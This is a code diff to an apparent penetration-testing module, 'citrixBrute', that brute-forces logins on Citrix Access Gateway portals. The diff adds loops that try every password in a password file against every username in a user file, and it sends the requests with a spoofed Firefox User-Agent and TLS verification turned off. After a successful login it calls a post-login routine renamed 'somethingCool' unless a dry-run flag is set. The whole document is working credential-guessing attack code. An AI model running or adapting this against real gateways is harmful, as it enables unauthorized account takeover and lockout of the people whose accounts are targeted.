@@ -13,7 +13,7 @@ class citrixBrute(webModule):
         self.fingerprint="Citrix Access Gateway"
         self.response="Success"
     ignore = ['Settings','Log Off']
-    def appDetect(self, config, c, cookie1, cookies):
+    def somethingCool(self, config, c, cookie1, cookies):
        c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': config["protocol"] + '://' + config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', 'Accept-Language': 'en-US,en;q=0.5'})
        resp1 = c.get(config["HOST"] +'/Citrix/XenAppCAGProd23/', cookies=cookies, allow_redirects=True, verify=False)
        silentDetect = c.get(config["HOST"] + '/Citrix/XenAppCAGProd23/auth/silentDetection.aspx', cookies=cookies, allow_redirects=True, verify=False)
@@ -51,22 +51,44 @@ class citrixBrute(webModule):
                     cookie1 = cpost.cookies['NSC_AAAC']
                     cookies = dict(NSC_AAAC=cookie1)
                     c.cookies.clear()
-                    self.appDetect(config, c, cookie1, cookies)
+                    if not config["dry_run"]:
+                        print("[!] Time to do something cool!")
+                        self.somethingCool(config, c, cookie1, cookies)
             else:
                 print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
     def payload(self, config):
+        if config["PASS_FILE"]:
+            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
+            for pass_line in pass_lines:
                 if config["UserFile"]:
-                        lines = [line.rstrip('\n') for line in open(config["UserFile"])]
-                        for line in lines:
-                            config["USERNAME"] = line.strip('\n')
-                            payload = {
-                                'login': config["USERNAME"],
-                                'passwd': config["PASSWORD"]
-                                }
-                            self.connectTest(config, payload)
+                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+                    for line in lines:
+                        config["USERNAME"] = line.strip('\n')
+                        config["PASSWORD"] = pass_line.strip('\n')
+                        payload = {
+                            'login': config["USERNAME"],
+                            'passwd': config["PASSWORD"]
+                            }
+                        self.connectTest(config, payload)
                 else:
+                    config["PASSWORD"] = pass_line.strip('\n')
                     payload = {
                         'login': config["USERNAME"],
                         'passwd': config["PASSWORD"]
                         }
                     self.connectTest(config, payload)
+        elif config["UserFile"]:
+            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
+            for line in lines:
+                config["USERNAME"] = line.strip('\n')
+                payload = {
+                    'login': config["USERNAME"],
+                    'passwd': config["PASSWORD"]
+                    }
+                self.connectTest(config, payload)
+        else:
+            payload = {
+                'login': config["USERNAME"],
+                'passwd': config["PASSWORD"]
+                }
+            self.connectTest(config, payload)
